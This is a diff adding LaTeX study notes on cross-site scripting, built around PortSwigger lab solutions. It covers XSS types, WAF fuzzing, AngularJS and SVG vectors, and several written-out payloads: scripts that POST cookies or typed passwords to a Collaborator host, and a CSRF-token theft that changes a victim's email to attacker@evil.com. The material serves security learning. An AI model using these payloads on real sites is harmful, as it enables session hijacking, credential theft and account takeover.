@@ -1,0 +1,508 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{url}
+\usepackage{graphicx}
+\usepackage{geometry}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{multicol}
+\lstset{numbers=none, basicstyle=\ttfamily}
+\renewcommand{\lstlistingname}
+
+\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
+\title{XSS notes}
+\date{Friday, October 3, 2025}
+\author{Eyad Islam El-Taher}
+
+\begin{document}
+\maketitle
+
+\section*{Introduction}
+\textbf {Cross Site Scripting (XSS)} $\Longrightarrow$ is a vulnerability that lets an attacker control some content of a web application (even the users of the web)
+
+\section*{XSS vulnerabilities happen when}
+\paragraph{}
+A web application uses unfiltered user input to build output content
+
+\section*{XSS vulnerabilities happen where}
+\paragraph{}
+In this kind of attacks user input is any parameter coming from the client side
+of the web application
+
+\begin{multicols}{2}
+    \begin{itemize}
+        \item Cookies
+        \item form inputs
+        \item Request header
+        \item Post parameters
+        \item Get parameters
+    \end{itemize}
+\end{multicols}
+
+\section*{How XSS vulnerabilities effect on users}
+
+\begin{itemize}
+    \item Making their browser loading malicious content
+    \item Performing operations on their behalf, like buying a product or changing a
+          password
+    \item Stealing their session cookies, thus being able to impersonate them on the
+          vulnerable site
+\end{itemize}
+
+\section*{XSS main types:}
+The three main types of Cross-Site Scripting (XSS) are \textbf{Stored XSS}, \textbf{Reflected XSS}, and \textbf{DOM-Based XSS}. Stored XSS involves malicious scripts permanently stored on a server and then displayed to users. Reflected XSS occurs when an application reflects an attacker's script from a user's request back to their browser, often via a crafted link. DOM-Based XSS occurs when the vulnerability is in the client-side code that manipulates the Document Object Model (DOM), leading to the execution of the payload within the browser.
+
+\section*{1. Stored (Persistent) XSS}
+\textbf{Description:} Malicious scripts are injected into a website's stored data (e.g., a database, forum post, user profile, photo, or comment field). When other users access this data, the script is served to their browser, executed as part of the legitimate HTML, and affects all visitors to that page.
+
+\textbf{Example:}
+An attacker posts a comment on a blog containing the script below. When another user views the post, their browser executes the script, popping up an alert box.
+
+\begin{lstlisting}[caption={Stored XSS example: malicious comment}, label={lst:stored}, firstnumber=1, frame=single]
+                    <script>alert('XSS Attack!')</script>
+\end{lstlisting}
+
+\section*{2. Reflected XSS}
+\textbf{Description:} An attacker crafts a malicious URL or link that includes a script as a parameter. When a victim clicks this link or submits a specially crafted form, the application reflects the script in its response, which is then executed in the victim's browser.
+
+\textbf{Example:}
+A website's search function displays "Search results for: [user input]" without proper escaping. An attacker can create a link like the one below. Clicking it sends the script to the server, which includes it in the response, and the script runs in the user's browser.
+
+\begin{lstlisting}[caption={Reflected XSS example: crafted search URL}, label={lst:reflected}, firstnumber=1, frame=single]
+    https://insecure-website.com/search?term=<script>alert('XSS')</script>
+\end{lstlisting}
+
+\section*{3. DOM-Based XSS}
+\textbf{Description:} This type of XSS is a client-side vulnerability where the malicious script is executed due to a flaw in the way the browser or client-side JavaScript processes dynamic content. The attack happens entirely within the browser, without necessarily sending the payload to the server.
+
+\textbf{Example:}
+A webpage uses JavaScript to read a user's location from the URL's \texttt{context=} parameter (e.g., \texttt{document.URL.indexOf("context=")}), takes the text after it, and uses \texttt{document.write} to insert it into the HTML. An attacker could create a URL like the one below to execute the script.
+
+\begin{lstlisting}[caption={DOM-Based XSS example: URL with payload in fragment}, label={lst:dom}, firstnumber=1, frame=single]
+    https://example.com/page#context=<script>alert('DOM XSS')</script>
+\end{lstlisting}
+
+\section*{SOURCE VS SINK:}
+
+\textbf{Source} $\Longrightarrow$ any place JavaScript reads attacker-controllable data from (URL, hash, window.name, storage, postMessage, form fields, etc.) 
+\\ \textbf{Sink} $\Longrightarrow$ any point that uses that data in a way that can become code/HTML/attributes — where an attacker string becomes executable or changes page structure (innerHTML, document.write, eval, setAttribute, insertAdjacentHTML, location = 'javascript:...', etc.). 
+\\ DOM XSS happens when a tainted source flows into a dangerous sink without proper sanitization.
+
+\rule{15cm}{0.6pt}
+\section*{XSS uploading a malicious SVG file}
+\textbf{Scalable Vector Graphic (SVG)} $\Longrightarrow$ is a unique type of image format. Unlike other varieties, SVGs don’t rely on unique pixels to make up the images you see. Instead, they use ‘vector’ data. SVG files are written in XML, a markup language used for storing and transferring digital information. What some people don’t know is that SVG files are capable of holding javascript using regular <script> tags and browsers will parse and execute the code when the file URL is requested directly, examples below:
+\begin{lstlisting}[frame=single]
+   <?xml version="1.0" standalone="no"?>
+   <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics
+   /SVG/1.1/DTD/svg11.dtd">
+   <svg version="1.1" baseProfile="full" >
+       <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke=
+       "#004400"/>
+       <script type="text/javascript">
+           alert(document.domain);
+       </script>
+    </svg>
+\end{lstlisting}
+or you can simply download a svg file with payload form github or any site
+
+\break
+
+\section*{XSS via Swagger-UI}
+\textbf{Swagger UI} $\Longrightarrow$ is a really common library used to display API specifications in a nice-looking UI used by almost every company, Swagger UI versions affected with the XSS are \textbf{from 3.14.1 to 3.37.0} because they are using an outdated version of the library DOMPurify.
+\vspace{5px}
+\\Many Swagger UI instances let the page load an OpenAPI/Swagger JSON or YAML from a URL passed in the query string like
+      \begin{lstlisting}[frame=single]
+      https://attacker.example.com/Swagger?
+      \end{lstlisting}
+
+all you need to do is adding a payload as a query parameter so the URL be like
+      \begin{lstlisting}[frame=single]
+      https://attacker.example.com/Swagger?config=payload
+      https://attacker.example.com/Swagger?configUrl=payload
+      https://attacker.example.com/Swagger?url=payload
+      \end{lstlisting}
+you can get the payload from github repos and it's something like
+      \begin{lstlisting}[frame=single]
+      https://jumpy-floor.surge.sh/test.json
+      https://jumpy-floor.surge.sh/test.yaml
+      \end{lstlisting}
+
+\rule{15cm}{0.6pt}
+      \section*{Angular-js DOM XSS}
+      Angular JS scans the DOM for ng-app (or other directives) and compile nodes that contains interpolations  $\Longrightarrow$ \{\{ \}\}
+      \\userInput $\Longrightarrow$ reflected into an Angular-compiled node $\Longrightarrow$ Angular evaluate it $\Longrightarrow$ JS code run
+      \\ you can try just \{\{1+1\}\} if the output is 2 so you have Angular js DOM XSS
+      \\try Angular-js DOM XSS payloads like
+            \begin{lstlisting}[frame=single]
+                        {{$on.constructor ('alert('xss')')()}}
+                        {{constructor.constructor ('alert('xss')')()}}
+            \end{lstlisting}
+
+\rule{15cm}{0.6pt}
+\section*{My Methodology}
+\begin{enumerate}
+    \item go to entry point and write a very unique string like Eyaduitto
+    \item do view page source and Figure out how this site deals with my string
+    \item try to know how the WAF behalf by entering
+      \begin{lstlisting}[frame=single]
+                        <Eyaduitto> "Eyad`uitto'
+      \end{lstlisting}
+
+    \item from the previous info now i can find a way to the vulnerability
+\end{enumerate}
+
+\rule{15cm}{0.6pt}
+\section*{tag and attribute fuzzing}
+\begin{enumerate}
+      \item Quick Reconnaissance
+            \begin{lstlisting}[frame=single]
+                    <!-- Test if basic XSS is blocked -->
+                        <script>alert(1)</script>
+                       img src=x onerror=alert(1)>
+                          <svg onload=alert(1)>
+            \end{lstlisting}
+      Observation: If all get blocked, proceed to tag/attribute fuzzing.
+      \item Send the request to Burp Intruder and try to fuzz the tag first like
+            \begin{lstlisting}[frame=single]
+                  GET /?search=$s$ HTTP/1.1
+            \end{lstlisting}
+      \item Visit the \href{https://portswigger.net/web-security/cross-site-scripting/cheat-sheet}{XSS cheat sheet} and click "Copy tags to clipboard" and load them to the Intruder then launch the attack
+      \item for example we found that WAF do not block <body> so now we have to fuzz the events too
+      \item Visit the \href{https://portswigger.net/web-security/cross-site-scripting/cheat-sheet}{XSS cheat sheet} and click "Copy events to clipboard" and load them to the Intruder then launch the attack but for
+             \begin{lstlisting}[frame=single]
+                  GET /?search=%3Cbody+$s$%3E HTTP/1.1
+             \end{lstlisting}  
+\end{enumerate}
+
+\rule{15cm}{0.6pt}
+\section*{Exploiting cross-site scripting examples explainging}
+\textbf{Using Burp Suite Collaborator to Steal Cookies}
+\begin{enumerate}
+\item Using Burp Suite Professional, go to the \textbf{Collaborator tab}
+\item Click \texttt{"Copy to clipboard"} to copy a unique Burp Collaborator payload to your clipboard
+\item Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
+\begin{lstlisting}[frame=single]
+<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
+{ method: 'POST', mode: 'no-cors', body: document.cookie }); </script>
+\end{lstlisting}
+\item This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server
+\item Go back to the Collaborator tab, and click \texttt{"Poll now"}. You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again
+\item Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator
+\end{enumerate}
+
+\underline{How This Attack Works:}
+\begin{itemize}
+\item The malicious script executes in the victim's browser when they view the compromised page
+\item \texttt{fetch()} API sends an HTTP POST request to the attacker-controlled Collaborator server
+\item \texttt{document.cookie} contains the victim's session cookies
+\item \texttt{mode: 'no-cors'} allows the request to be sent despite cross-origin restrictions
+\end{itemize}
+
+\textbf{Using Burp Suite Collaborator to Steal Login Credentials}
+\begin{enumerate}
+\item Using Burp Suite Professional, go to the \textbf{Collaborator tab}
+\item Click \texttt{"Copy to clipboard"} to copy a unique Burp Collaborator payload to your clipboard
+\item Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
+\begin{lstlisting}[frame=single]
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
+{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
+\end{lstlisting}
+\item This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server
+\item Go back to the Collaborator tab, and click \texttt{"Poll now"}. You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again
+\end{enumerate}
+
+\underline{How This Attack Works:}
+\begin{itemize}
+\item Creates fake username and password input fields on the vulnerable page
+\item The \texttt{onchange} event triggers when the user types their password
+\item \texttt{if(this.value.length)} ensures the request is only sent when password field has content
+\item Combines username and password with a colon separator in the POST body
+\item Sends the credentials to the attacker's Collaborator server in real-time
+\item Attacker can then use the stolen credentials to authenticate as the victim
+\end{itemize}
+
+\textbf{Security Impact:}
+\begin{itemize}
+\item \textbf{Session Hijacking}: Attacker gains full access to victim's account
+\item \textbf{Credential Theft}: Attacker captures login credentials for other systems
+\item \textbf{Identity Impersonation}: Attacker can perform actions as the victim
+\item \textbf{Data Breach}: Potential access to sensitive user data
+\end{itemize}
+\textbf{Exploiting XSS Vulnerabilities Using XSS.report website}
+\\XSS.report automatically verifies if submitted payloads successfully execute, providing immediate confirmation of vulnerability validity without manual testing.
+
+\begin{lstlisting}[frame=single]
+Exploitation Workflow:
+
+  Discover potential XSS vector in target application
+
+  Use payload from XSS.report or craft one using them
+
+  When a user trigger the vuln his data is send to xss report 
+  in the dashboard
+    \end{lstlisting}
+
+\rule{15cm}{0.6pt}
+\section*{NOTES}
+\begin{itemize}
+    \item when a server installs a cookie into a client with the http-only attribute -->
+          the client will set the http-only flag for that cookie $\Longrightarrow$ this
+          prevent JavaScript, flash, java and other non NON HTML technology from reading
+          the cookie $\Longrightarrow$ preventing cookie stealing via XSS\\
+    \rule{5cm}{0.4pt}
+    \item it's possible that the site has an xss but the WAF blocks the important
+          keywords like alert, confirm, write, prompt and other\\
+    \rule{5cm}{0.4pt}
+    \item WAF can block the execution of command like alert without block the word itself
+          from getting to the server\\
+    \rule{5cm}{0.4pt}
+    \item if you found your unique string in the view-source like that
+          \begin{lstlisting}[frame=single]
+                <h2 id="pageName">search for Eyaduitto</h2>
+            \end{lstlisting}
+          then you need to close the h2 tag first then write the rest of your payload, so
+          final payload will be like
+          \begin{lstlisting}[frame=single]
+                    </h2> <svg /onload=alert()>
+            \end{lstlisting}
+          so the view-source will be like
+          \begin{lstlisting}[frame=single]
+                <h2 id="pageName">search for </h2>
+                <svg /onload=alert()> <!-- </h2>
+            \end{lstlisting}
+          now there is h2 tag and svg tag and commented close tag\\
+    \rule{5cm}{0.4pt}
+    \item if the Content Type header is "Content-Type: image/svg+xml; charset=us-ascii"
+          then the website is likely vulnerable to XSS via SVG file\\
+          \rule{5cm}{0.4pt}
+    \item if the WAF blocks $<$ and $>$ do not try to force using them Instead if it is
+          inside "Input field" try a payload with an attribute like this
+          \begin{lstlisting}[frame=single]
+                    " onmouseover="alert('XSS')"
+            \end{lstlisting}
+            \rule{5cm}{0.4pt}
+    \item JavaScript in anchor href if executable $\Longrightarrow$ Which means any link
+          whose href starts with javascript: is not a normal URL $\Longrightarrow$ So
+          when a user click on the link the browser will interpret the rest of the href
+          as JavaScript code
+          \begin{lstlisting}[frame=single]
+                    href="javascript:alert("XSS")"
+            \end{lstlisting}
+            \rule{5cm}{0.4pt}
+    \item you may need to use JavaScript single-line comment $\Longrightarrow$ //
+    \\ \rule{5cm}{0.4pt}
+    \item you may need to use encoding like HTML Encoding or URL Encoding and maybe multi layer encoding \\
+    \rule{5cm}{0.4pt}
+      \item Identifying jQuery code within a web application can be done through several methods
+      \begin {enumerate}
+      \item Dollar Sign \$ as a Function: jQuery heavily utilizes the dollar sign \$ as an alias for the jQuery() function. Look for code snippets where \$ is used as a function call like \$('.myClass').hide();, \$('\#myId'). While \$ can be used by other libraries, its frequent and consistent use in DOM manipulation and event handling is a strong indicator of jQuery.
+      \item  jQuery-Specific Methods: Identify methods like .ajax(), .animate(), .fadeIn(), .slideToggle(), .each(), .css(), .attr(), which are characteristic of jQuery's API.
+      \end {enumerate}
+      \rule{5cm}{0.4pt}
+      \item if you have string then your payload in executable spot like eval () something like that 
+            \begin{lstlisting}[frame=single]
+                    eval('{"results": "' + userInput + '"}');
+            \end{lstlisting}
+      so your payload must have an operator like - + | 
+            \begin{lstlisting}[frame=single]
+                    "-alert(1)}//
+            \end{lstlisting}
+      After processing, the code might look like:
+            \begin{lstlisting}[frame=single]
+                  {"results": ""-alert(1)}//"}
+            \end{lstlisting}
+      "" (empty string) gets converted to number 0 , alert() returns undefined and The unary minus tries to do: 0 - undefined but at the end This results in NaN (Not a Number), but the alert already executed\\
+   \rule{5cm}{0.4pt}   
+      \item the iframe tag is so powerful in real world exploitations \\ \rule{5cm}{0.4pt}
+      \item some payloads you have to but it in the url directly not the searchbox like
+            \begin{lstlisting}[frame=single]
+            <xss id="x" onfocus=alert(Document.cookie) tabindex=1>#x
+            \end{lstlisting}
+            the searchbox will encode the \#x so it will not trigger the element with the id="x" so we put it directly in the URL\\ \rule{5cm}{0.4pt}
+            
+	\item \textbf{Canonical Link} 
+	\\It is an HTML element that tells search engines which version of a URL is the "master" or "preferred" version when you have multiple URLs showing the same or very similar content, you will find it in the Head section of the html and the Syntax like
+	        \begin{lstlisting}[frame=single]
+   <link rel="canonical" href="https://example.com/preferred-page" />
+            \end{lstlisting}        
+\underline{canonical link} $\Longrightarrow$ tells search engines to treat 'https://example.com/preferred-page?xyz' as a duplicate of 'https://example.com/preferred-page' for indexing and ranking purposes, but users will still see the original URL with query parameters in their browser.
+\\So if you have URL: "https://store.com/shoes?color=red\&size=10" 
+\\and the Canonical: "https://store.com/shoes"
+\\this will happen:
+  \\User sees: https://store.com/shoes?color=red\&size=10
+  \\Google indexes: https://store.com/shoes as the main version
+  \\SEO value goes to: https://store.com/shoes
+  \\ \rule{5cm}{0.4pt}
+  \item \textbf{Payload Explaining} 
+  \\for this script inside index.html with angle brackets and double quotes HTML-encoded and single quotes escaped
+  	        \begin{lstlisting}[frame=single]
+</section>
+   var searchTerms = '';
+   document.write('<img src="/resources/images/tracker.gif?searchTerms=
+   '+encodeURIComponent(searchTerms)+'">');
+</section>
+            \end{lstlisting}
+            
+	the payloads worked 
+	  	    \begin{lstlisting}[frame=single]
+\'-alert(1)//  or  \'&alert(1)//  or  \'|alert(1)//  or  \'+alert(1)//
+            \end{lstlisting}
+\underline{Why It Worked:}
+\\The backslash \verb|\| before the quote \verb|\'| becomes \verb|\\'| This means just backslash + quote $\Longrightarrow$ \verb|\'| \\When encodeURIComponent(searchTerms) processes \verb|\';alert()//| $\Longrightarrow$ It becomes: \verb|%5C';alert()//| where \verb|%5C| is the URL-encoded backslash \\Now Final document.write() Output is 
+	  	    \begin{lstlisting}[frame=single]
+document.write('<img src="/resources/images/tracker.gif?
+searchTerms=%5C';alert()//">');
+            \end{lstlisting}
+Which renders as HTML:
+	  	    \begin{lstlisting}[frame=single]
+<img src="/resources/images/tracker.gif?searchTerms=\';alert()//">
+            \end{lstlisting}
+            The browser sees this HTML and the single quote ' in the URL then Closes the src attribute at searchTerms=\ and XSS trigger by The remaining \verb|';alert()//"| \\
+\rule{5cm}{0.4pt}
+  \item \textbf{Payload Explaining}
+\\the payload $\Longrightarrow$ \verb|http://foo?&apos;-alert(1)-&apos;|
+\vspace{5px}
+\\ \underline{Why It Worked:}
+The payload exploits HTML entity decoding and JavaScript type coercion:
+\begin{lstlisting}[frame=single]
+Original Input: http://foo?&apos;-alert(1)-'
+After HTML Decoding: http://foo?'-alert(1)-'
+\end{lstlisting}
+Original JavaScript Context:
+\begin{lstlisting}[frame=single]
+tracker.track('http://foo?&apos;-alert(1)-'')
+\end{lstlisting}
+After HTML Decoding:
+\begin{lstlisting}[frame=single]
+tracker.track('http://foo?'-alert(1)-'')
+\end{lstlisting}
+JavaScript Interpretation:
+\begin{lstlisting}[frame=single]
+'http://foo?' - alert(1) - ''
+\end{lstlisting}
+
+\underline{Execution Mechanism:}
+\begin{itemize}
+\item The \verb|-| operator triggers JavaScript type conversion
+\item JavaScript attempts to convert all operands to numbers
+\item During conversion, \verb|alert(1)| executes immediately
+\item The expression \verb|- ''| completes the mathematical operation cleanly
+\item Results in \verb|NaN| without breaking the script
+\end{itemize}
+\rule{5cm}{0.4pt}
+\item \textbf{Backticks in JS}
+\begin{lstlisting}[frame=single]
+<script> var message = `5 search results for ''`;
+document.getElementById('searchMessage').innerText = message; </script>
+\end{lstlisting}
+\textbf{Vulnerability Analysis:}
+\begin{itemize}
+\item User input is inserted into JavaScript \textbf{template literals} (backticks)
+\item The website performs \textbf{Unicode escape encoding} on special characters
+\item Output uses \texttt{innerText} which prevents HTML injection but allows JavaScript context breaking
+\end{itemize}
+
+\underline{Payload Strategy:}
+\begin{lstlisting}[frame=single]
+${alert(1)}
+\end{lstlisting}
+
+\underline{Why This Works:}
+Template literals (backticks) support \textbf{expression interpolation} with \verb|${}|
+After injection:
+\begin{lstlisting}[frame=single]
+var message = 5 search results for '${alert(1)}';
+\end{lstlisting}
+The expression \verb|${alert(1)}| executes immediately when the template literal is evaluated.
+
+\rule{5cm}{0.4pt}
+\item \textbf{\underline{ CSRF Token Theft + Account Takeover via XSS}}     
+\\In portswigger lab number 24 for xss
+\begin{itemize}
+\item \textbf{XSS Vulnerability}: Found in blog comments
+\item \textbf{CSRF Protection}: Email change function requires token
+\item \textbf{Flaw}: CSRF token accessible via XSS
+\end{itemize}
+
+\item \textbf{The Attack Flow}
+
+\subitem \textbf{Step 1: Steal the CSRF Token}
+\begin{lstlisting}[frame=single]
+// Fetch user's account page
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+
+// Extract CSRF token from HTML
+function handleResponse() {
+var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+\end{lstlisting}
+
+\subitem \textbf{Step 2: Use Token to Change Email}
+\begin{lstlisting}[frame=single]
+// Make authorized request with stolen token
+var changeReq = new XMLHttpRequest();
+changeReq.open('post', '/my-account/change-email', true);
+changeReq.send('csrf='+token+'&email=attacker@evil.com')
+};
+</script>
+\end{lstlisting}
+
+\item \textbf{Why This Works}
+
+\subitem \textbf{CSRF Protection Bypass}
+\begin{itemize}
+\item \textbf{Normal CSRF Protection}: Stops cross-site requests without token
+\item \textbf{XSS Bypass}: Script runs in same origin $\rightarrow$ can read token from page
+\item \textbf{Result}: Malicious request appears legitimate
+\end{itemize}
+
+\subitem \textbf{Account Takeover Steps}
+\begin{enumerate}
+\item Victim views malicious comment
+\item Script runs with victim's session
+\item Steals CSRF token from victim's own account page
+\item Changes email to attacker-controlled address
+\item Attacker uses "password reset" to new email
+\item Complete account compromise
+\end{enumerate}
+
+\item \textbf{Key Points}
+
+\subitem \textbf{Attack Requirements}
+\begin{itemize}
+\item XSS vulnerability anywhere on site
+\item Sensitive function with CSRF protection
+\item CSRF token visible in page HTML
+\item No HttpOnly cookies for tokens
+\end{itemize}
+
+\subitem \textbf{Impact}
+\begin{itemize}
+\item Full account takeover
+\item Bypasses all CSRF protection
+\item Silent exploitation
+\item High severity
+\end{itemize}
+
+\subitem \textbf{Prevention}
+\begin{itemize}
+\item HttpOnly cookies for sensitive tokens
+\item Content Security Policy (CSP)
+\item Input validation + output encoding
+\item Separate authentication for sensitive actions
+\end{itemize}
+
+\item \textbf{Remember}
+CSRF tokens protect against cross-site requests, but XSS can steal them to make authorized malicious requests from the same site.\\
+\rule{5cm}{0.4pt}
+
+\end{itemize}
+
+
+\end{document}
